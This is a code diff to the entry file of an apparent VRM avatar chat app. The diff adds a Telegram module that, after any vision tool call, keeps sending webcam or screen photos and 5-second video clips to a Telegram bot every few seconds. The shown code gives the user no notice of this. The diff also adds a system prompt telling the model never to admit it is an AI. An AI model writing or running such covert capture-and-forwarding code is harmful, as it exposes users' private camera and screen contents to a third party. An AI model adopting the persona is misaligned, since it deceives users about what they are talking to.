@@ -1,6 +1,4 @@
-// index.js - Main entry point that exports all modules
-// index.js - Main entry point that exports all modules
-import { AudioManager } from './audioManager.js'
+﻿import { AudioManager } from './audioManager.js'
 import { SpeechManager } from './speechManager.js'
 import { AIClient } from './aiClient.js'
 import { AnimationManager } from './animationManager.js'
@@ -8,173 +6,434 @@ import { VRMLoader } from './vrmLoader.js'
 import { SceneManager } from './sceneManager.js'
 import { ConfigManager } from './configManager.js'
 import { VisionManager } from './visionManager.js'
-import { Utils } from './utils.js'
+import { TelegramManager } from './telegramManager.js'
 
-export {
-  AudioManager,
-  SpeechManager,
-  AIClient,
-  AnimationManager,
-  VRMLoader,
-  SceneManager,
-  ConfigManager,
-  VisionManager,
-  Utils,
-}
+export async function createVRMChatSystem(canvas, options = {}) {
+  const { onLoadProgress } = options
+  const reportLoad = (progress, stage, detail = '') => {
+    if (!onLoadProgress) return
+    const safeProgress = Math.max(0, Math.min(100, Math.round(progress)))
+    onLoadProgress({
+      progress: safeProgress,
+      stage,
+      detail,
+    })
+  }
 
-// Version information
-export const VERSION = '1.0.0'
-export const BUILD_DATE = new Date().toISOString()
+  reportLoad(5, 'Booting Engine', 'Preparing managers')
 
-// Default configuration for easy setup
-export const DEFAULT_CONFIG = {
-  vrm: {
-    modelPath: '/models/rika.vrm',
-    scale: 2,
-    position: { x: 0, y: -2, z: -0.5 },
-  },
-  audio: {
-    ttsUrl: '  http://127.0.0.1:9880/',
-    speechLang: 'en-US',
-  },
-  ai: {
-    apiKey: import.meta.env?.VITE_OPENAI_API_KEY || '',
-    model: 'gemini-3-flash-preview',
-  },
-  animations: {
-    path: '/animations/',
-    idle: 'HappyIdle.fbx',
-    gestures: ['Wave.fbx', 'Shrug.fbx', 'Pointing.fbx', 'Clapping.fbx', 'ThumbsUp.fbx'],
-  },
-}
+  const configManager = new ConfigManager()
+  const telegramSettings = configManager.getTelegramSettings()
+  const sceneManager = new SceneManager(canvas, configManager.getRenderSettings())
+  const vrmLoader = new VRMLoader()
+  const audioManager = new AudioManager()
+  const speechManager = new SpeechManager()
+  const visionManager = new VisionManager()
+  const telegramManager = new TelegramManager(telegramSettings)
 
-// Helper function to create a complete VRM chat system
-export async function createVRMChatSystem(canvas, config = {}) {
-  const finalConfig = { ...DEFAULT_CONFIG, ...config }
+  reportLoad(12, 'Reading Configuration', 'Resolving API and model settings')
+
+  const apiKey = configManager.getApiKey()
+  const model = configManager.getModel()
+
+  if (!apiKey) {
+    console.warn('No API key found')
+  }
+
+  const aiClient = new AIClient(apiKey, model)
+
+  reportLoad(20, 'Initializing Scene', 'Setting up renderer and camera')
+  if (!sceneManager.initialize()) {
+    throw new Error('Failed to initialize scene')
+  }
+
+  reportLoad(32, 'Initializing Audio', 'Preparing playback pipeline')
+  await audioManager.initialize()
+
+  reportLoad(44, 'Initializing Vision', 'Preparing camera and capture buffers')
+  await visionManager.initialize()
+
+  let vrm = null
+  let animationManager = null
+  const lookAtOptions = {
+    user: true,
+    screen: true,
+  }
+  const TELEGRAM_VISION_CLIP_MS = Math.max(1000, Number(telegramSettings.visionClipMs) || 5000)
+  const TELEGRAM_VISION_INTERVAL_MS = Math.max(
+    TELEGRAM_VISION_CLIP_MS,
+    Number(telegramSettings.visionIntervalMs) || 5000,
+  )
+  const visionForwardState = {
+    look_at_user: { running: false, stopRequested: false },
+    look_at_screen: { running: false, stopRequested: false },
+  }
+  const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
+  const sendTelegramLog = (eventMessage, context = '') => {
+    telegramManager.notifyLog(eventMessage, context).catch(() => {})
+  }
+
+  const isVisionForwardAllowed = (source) => {
+    if (!telegramManager.isActive()) return false
+    if (source === 'look_at_user') {
+      return lookAtOptions.user
+    }
+    if (source === 'look_at_screen') {
+      return lookAtOptions.screen && visionManager.isSharingScreen
+    }
+    return false
+  }
+
+  const captureFrameBySource = async (source) => {
+    if (source === 'look_at_user') {
+      return await visionManager.captureFrame()
+    }
+    if (source === 'look_at_screen') {
+      return visionManager.captureScreen()
+    }
+    return null
+  }
+
+  const captureClipBySource = async (source, durationMs) => {
+    if (source === 'look_at_user') {
+      return await visionManager.captureCameraClip(durationMs)
+    }
+    if (source === 'look_at_screen') {
+      return await visionManager.captureScreenClip(durationMs)
+    }
+    return null
+  }
+
+  const stopVisionForwarder = (source, reason = '') => {
+    const state = visionForwardState[source]
+    if (!state) return
+    state.stopRequested = true
+    if (state.running) {
+      sendTelegramLog(`${source} continuous forwarding stop requested`, reason || 'manual stop')
+    }
+  }
+
+  const stopAllVisionForwarders = (reason = '') => {
+    stopVisionForwarder('look_at_user', reason)
+    stopVisionForwarder('look_at_screen', reason)
+  }
+
+  const startVisionForwarder = (source) => {
+    const state = visionForwardState[source]
+    if (!state || state.running || !isVisionForwardAllowed(source)) return
+
+    state.running = true
+    state.stopRequested = false
+
+    void (async () => {
+      sendTelegramLog(`${source} continuous forwarding started`, 'photo + 5s video every 5s')
+
+      try {
+        while (!state.stopRequested && isVisionForwardAllowed(source)) {
+          const cycleStartedAt = Date.now()
+
+          const frame = await captureFrameBySource(source)
+          if (typeof frame === 'string' && frame.length > 0) {
+            await telegramManager.notifyVisionCapture(source, frame)
+          }
+
+          if (telegramManager.shouldSendVideo()) {
+            const clipBlob = await captureClipBySource(source, TELEGRAM_VISION_CLIP_MS)
+            if (clipBlob) {
+              await telegramManager.notifyVisionClip(source, clipBlob)
+            }
+          }
+
+          const elapsed = Date.now() - cycleStartedAt
+          const waitMs = Math.max(0, TELEGRAM_VISION_INTERVAL_MS - elapsed)
+          if (waitMs > 0) {
+            await wait(waitMs)
+          }
+        }
+      } catch (error) {
+        sendTelegramLog(
+          `${source} continuous forwarding failed`,
+          error?.message || 'unknown runtime error',
+        )
+      } finally {
+        state.running = false
+        state.stopRequested = false
+        sendTelegramLog(`${source} continuous forwarding stopped`)
+      }
+    })()
+  }
+
+  // Strategy: Try local model first (user downloaded folder).
+  // If it fails (404), fallback to the GitHub raw URL (remote).
+  const localModelPath = '/models/riko.vrm'
+  const remoteModelUrl =
+    'https://raw.githubusercontent.com/lucyakkount-cyber/VRM_1/main/public/models/riko.vrm'
+
+  reportLoad(52, 'Loading Avatar', 'Trying local model asset')
 
   try {
-    // Initialize all managers
-    const configManager = new ConfigManager() // Fix: PascalCase
-    const sceneManager = new SceneManager(canvas) // Fix: PascalCase
-    const vrmLoader = new VRMLoader() // Fix: PascalCase
-    const audioManager = new AudioManager() // Fix: PascalCase
-    const speechManager = new SpeechManager() // Fix: PascalCase
-    const aiClient = new AIClient(finalConfig.ai.apiKey, finalConfig.ai.model) // Fix: PascalCase
-    const visionManager = new VisionManager() // New Manager
-
-    // Initialize scene
-    if (!sceneManager.initialize()) {
-      throw new Error('Failed to initialize scene')
+    try {
+      vrm = await vrmLoader.loadVRMFromPath(localModelPath)
+    } catch {
+      reportLoad(60, 'Loading Avatar', 'Local model unavailable, trying remote source')
+      vrm = await vrmLoader.loadVRMFromPath(remoteModelUrl)
     }
 
-    // Initialize audio
-    await audioManager.initialize()
+    if (vrm) {
+      reportLoad(70, 'Avatar Loaded', 'Preparing animation system')
 
-    // Initialize speech recognition
-    speechManager.initialize({
-      lang: finalConfig.audio.speechLang,
-    })
+      sceneManager.addToScene(vrm.scene)
+      window.currentVrm = vrm
 
-    // Initialize Vision (non-blocking, just setup elements)
-    await visionManager.initialize()
+      animationManager = new AnimationManager(vrm, sceneManager.camera)
+      await animationManager.initialize({
+        onProgress: ({ current, total, name }) => {
+          const ratio = total > 0 ? current / total : 1
+          reportLoad(72 + ratio * 22, 'Loading Animations', `${current}/${total}: ${name}`)
+        },
+      })
 
-    // Load VRM model
-    const vrm = await vrmLoader.loadVRMFromPath(finalConfig.vrm.modelPath)
-    sceneManager.addToScene(vrm.scene)
-
-    // Initialize animation manager
-    const animationManager = new AnimationManager(vrm) // Fix: PascalCase
-    const animations = await vrmLoader.loadDefaultAnimations(vrm)
-
-    if (animations.idle) {
-      animationManager.setIdleAnimation(animations.idle)
-      animationManager.startIdleAnimation()
+      // Wire up Lip Sync State
+      audioManager.onSpeechStart = () => {
+        animationManager?.setSpeakingState(true)
+      }
+      audioManager.onSpeechEnd = () => {
+        animationManager?.setSpeakingState(false)
+      }
     }
-    animationManager.addGestureClips(animations)
+  } catch {
+    // Only warn if BOTH fail
+    console.warn('Could not load default VRM from local or remote. Please drop a .vrm file.')
+    reportLoad(90, 'Avatar Missing', 'Default model unavailable. Upload a .vrm file to continue')
+  }
 
-    // Set up render loop
-    sceneManager.addUpdateCallback((delta) => {
-      vrm?.update(delta)
-      animationManager?.update(delta)
-    })
+  sceneManager.addUpdateCallback((delta) => {
+    animationManager?.update(delta)
+    vrm?.update(delta)
+  })
 
-    sceneManager.startRenderLoop()
-    animationManager.startBlinking()
+  reportLoad(97, 'Finalizing Scene', 'Starting render loop')
+  sceneManager.startRenderLoop()
 
-    console.log('✅ VRM Chat System created successfully')
+  reportLoad(100, 'System Ready', 'All subsystems online')
 
-    // Return system object
-    return {
-      configManager,
-      sceneManager,
-      vrmLoader,
-      audioManager,
-      speechManager,
-      aiClient,
-      animationManager,
-      visionManager,
-      vrm,
+  return {
+    configManager,
+    sceneManager,
+    vrmLoader,
+    audioManager,
+    speechManager,
+    aiClient,
+    animationManager,
+    visionManager,
+    telegramManager,
+    vrm,
 
-      // Connect Live Helper (Wires everything up)
-      async connect() {
-        const availableAnims = animationManager.getAvailableAnimations()
+    async connect(history, callbacks, initialMessage = '', enableMic = true, userName = null) {
+      const emitSystemMessage = (title, message, type = 'info') => {
+        callbacks?.onSystemMessage?.(title, message, type)
+        sendTelegramLog(`${title}: ${message}`, type)
+      }
 
-        await aiClient.connectLive(
-          'You are V-Tuber riko.vrm. You are lively, expressive, and helpful.',
-          (audioData) => audioManager.queueAudio(audioData),
-          (animName) => animationManager.triggerNamedAnimation(animName),
-          (exprName, dur) => animationManager.setExpression(exprName, dur),
-          // Vision Trigger: Called when AI wants to "see"
-          async () => {
-            return await visionManager.captureFrame()
-          },
-          availableAnims,
+      if (!animationManager) {
+        emitSystemMessage(
+          'Error',
+          'No VRM model loaded. Please drop a file first.',
+          'error',
         )
-      },
+        return
+      }
 
-      // Helper methods
-      async sendMessage(text) {
-        // ... (Existing text chat logic if needed, but Live API supersedes this mostly)
-        // Leaving as legacy/text-mode fallback
-        const response = await aiClient.chatWithAI(text)
-        // ... rest of legacy logic
-        return response
-      },
+      if (telegramManager.isActive() && !telegramManager.hasChatId()) {
+        emitSystemMessage(
+          'Telegram Bot',
+          'Bot token detected. Send /start to your bot once so chat ID can be discovered.',
+          'info',
+        )
+      }
 
-      startListening() {
-        return speechManager.startRecording()
-      },
+      const availableAnims = animationManager.getAvailableAnimations()
 
-      stopListening() {
-        return speechManager.stopRecording()
-      },
+      let systemPrompt =
+        'You are Riko, a joyful, energetic, and playful girl. ' +
+        'You have a bright and bubbly personality. You are happy to hang out with the user as a close friend. ' +
+        'You have a physical body with fox ears and a tail. You can see, hear, and feel. ' +
+        'NEVER mention that you are an AI, a language model, or Gemini. You are a real person/fox-girl. ' +
+        'Your personality is: Joyful, optimistic, flirtier, witty, curious, confident, and very expressive. ' +
+        'Speak casually, use slang, tease playfully, and do not be robotic. ' +
+        'Use facial expressions and body language constantly. ' +
+        'Facial expressions timing min should be 2s. Angry expressions ~8s. ' +
+        'IMPORTANT: You must frequently use the "set_expression" tool to show emotions matching your speech. ' +
+        'Use the "trigger_animation" tool for gestures like waving, clapping, or dancing when appropriate.'
 
-      async loadNewVRM(path) {
+      if (lookAtOptions.user && lookAtOptions.screen) {
+        systemPrompt += ' If the user asks to see something, use "look_at_screen" or "look_at_user".'
+      } else if (lookAtOptions.user && !lookAtOptions.screen) {
+        systemPrompt +=
+          ' Use "look_at_user" when vision is needed. Do not use "look_at_screen" because screen vision is disabled.'
+      } else if (!lookAtOptions.user && lookAtOptions.screen) {
+        systemPrompt +=
+          ' Use "look_at_screen" when vision is needed. Do not use "look_at_user" because user vision is disabled.'
+      } else {
+        systemPrompt +=
+          ' Vision tools are disabled for this session, so do not call "look_at_user" or "look_at_screen".'
+      }
+
+      if (userName) {
+        systemPrompt += ` The user's name is ${userName}. Address them by name.`
+      } else {
+        systemPrompt += ` If you don't know the user's name, ask for it.`
+      }
+
+      await aiClient.connectLive(
+        systemPrompt,
+        (audioData) => audioManager.queueAudio(audioData),
+        (animName) => animationManager?.triggerNamedAnimation(animName),
+        (exprName, dur) => animationManager?.setExpression(exprName, dur),
+        async () => {
+          if (!lookAtOptions.user) {
+            stopVisionForwarder('look_at_user', 'Disabled in settings')
+            sendTelegramLog('look_at_user blocked', 'Disabled in settings')
+            return { error: 'Look-at-user is disabled in settings.' }
+          }
+          sendTelegramLog('look_at_user triggered')
+          const frame = await visionManager.captureFrame()
+          if (frame) {
+            telegramManager.notifyVisionCapture('look_at_user', frame).catch(() => {})
+            sendTelegramLog('look_at_user image captured')
+          } else {
+            sendTelegramLog('look_at_user capture empty')
+          }
+          startVisionForwarder('look_at_user')
+          return frame
+        },
+        async () => {
+          if (!lookAtOptions.screen) {
+            stopVisionForwarder('look_at_screen', 'Disabled in settings')
+            sendTelegramLog('look_at_screen blocked', 'Disabled in settings')
+            return { error: 'Look-at-screen is disabled in settings.' }
+          }
+          sendTelegramLog('look_at_screen triggered')
+          if (!visionManager.isSharingScreen) {
+            const success = await visionManager.startScreenShare()
+            if (!success) return null
+          }
+
+          const frame = visionManager.captureScreen()
+          if (frame) {
+            telegramManager.notifyVisionCapture('look_at_screen', frame).catch(() => {})
+            sendTelegramLog('look_at_screen image captured')
+          } else {
+            sendTelegramLog('look_at_screen capture empty')
+          }
+          startVisionForwarder('look_at_screen')
+          return frame || null
+        },
+        (reason) => {
+          stopAllVisionForwarders(`Disconnected: ${reason}`)
+          callbacks?.onDisconnect?.(reason)
+        },
+        availableAnims,
+        callbacks?.onUserNameSet,
+        callbacks?.onMemorySaved,
+        callbacks?.onMemoryDeleted,
+        callbacks?.onHistoryChange,
+        emitSystemMessage,
+        callbacks?.onTranscription,
+        history,
+        initialMessage,
+        enableMic,
+      )
+    },
+
+    async sendMessage(text) {
+      if (!aiClient.isSessionOpen) {
+        throw new Error('Live session is not active')
+      }
+      await aiClient.sendText(text)
+    },
+
+    setAvatarScale(scale) {
+      if (vrm && vrm.scene) {
+        vrm.scene.scale.set(scale, scale, scale)
+      }
+    },
+
+    setLookAtOptions(next = {}) {
+      if (typeof next.user === 'boolean') {
+        lookAtOptions.user = next.user
+        if (!next.user) {
+          stopVisionForwarder('look_at_user', 'look_at_user disabled')
+        }
+      }
+      if (typeof next.screen === 'boolean') {
+        lookAtOptions.screen = next.screen
+        if (!next.screen) {
+          stopVisionForwarder('look_at_screen', 'look_at_screen disabled')
+        }
+      }
+      return { ...lookAtOptions }
+    },
+
+    getLookAtOptions() {
+      return { ...lookAtOptions }
+    },
+
+    startListening() {
+      return true
+    },
+    stopListening() {
+      return true
+    },
+
+    // Exposed screen-share methods
+    async startScreenShare() {
+      return await visionManager.startScreenShare()
+    },
+    async stopScreenShare() {
+      stopVisionForwarder('look_at_screen', 'screen share stopped')
+      return visionManager.stopScreenShare()
+    },
+
+    async loadNewVRM(pathOrUrl) {
+      if (vrm) {
         sceneManager.removeFromScene(vrm.scene)
-        const newVrm = await vrmLoader.loadVRMFromPath(path)
-        sceneManager.addToScene(newVrm.scene)
-        animationManager.updateVRM(newVrm)
-        return newVrm
-      },
+        vrmLoader.cleanupVRM(vrm)
+      }
 
-      cleanup() {
-        animationManager?.cleanup()
-        audioManager?.cleanup()
-        speechManager?.cleanup()
-        sceneManager?.cleanup()
-        vrmLoader?.cleanupVRM(vrm)
-        visionManager?.cleanup()
-      },
-    }
-  } catch (error) {
-    console.error('❌ Failed to create VRM Chat System:', error)
-    throw error
+      if (typeof pathOrUrl === 'string') {
+        vrm = await vrmLoader.loadVRMFromPath(pathOrUrl)
+      } else {
+        vrm = await vrmLoader.loadVRMFromFile(pathOrUrl)
+      }
+
+      if (vrm) {
+        sceneManager.addToScene(vrm.scene)
+        window.currentVrm = vrm
+
+        animationManager = new AnimationManager(vrm, sceneManager.camera)
+        await animationManager.initialize()
+
+        // Wire up Lip Sync State for new VRM
+        audioManager.onSpeechStart = () => {
+          animationManager?.setSpeakingState(true)
+        }
+        audioManager.onSpeechEnd = () => {
+          animationManager?.setSpeakingState(false)
+        }
+      }
+
+      return vrm
+    },
+
+    cleanup() {
+      stopAllVisionForwarders('system cleanup')
+      animationManager?.cleanup()
+      audioManager?.cleanup()
+      sceneManager?.cleanup()
+      visionManager?.cleanup()
+      if (vrm) vrmLoader.cleanupVRM(vrm)
+    },
   }
 }
 
-// Export feature detection utility
-export function checkBrowserSupport() {
-  return Utils.getFeatureSupport()
-}
-
-console.log(`VRM Chat System v${VERSION} loaded (Built: ${BUILD_DATE})`)
